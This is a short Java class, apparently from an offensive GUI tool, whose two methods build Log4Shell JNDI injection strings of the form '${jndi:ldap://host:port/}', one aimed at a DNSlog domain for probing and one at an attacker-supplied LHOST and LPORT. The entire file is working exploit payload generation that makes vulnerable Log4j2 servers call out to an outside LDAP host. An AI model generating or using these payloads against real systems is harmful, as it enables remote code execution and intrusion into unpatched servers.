package com.bashgui.controller;

import com.bashgui.bean.OptionsBean;

/**
 * @date: 2022/12/28 20:19
 * @description:
 */
public class Log4j2 extends OptionsBean {
    public static String LoDnslog4j2(String Dnslog4j2){
        String str = "${jndi:ldap://"+Dnslog4j2+"/}";
        return str;
    }

    public static String LoIPlog4j2(String Lhost,String lport){
        String str = "${jndi:ldap://"+Lhost+":"+lport+"/}";
        return str;
    }
}
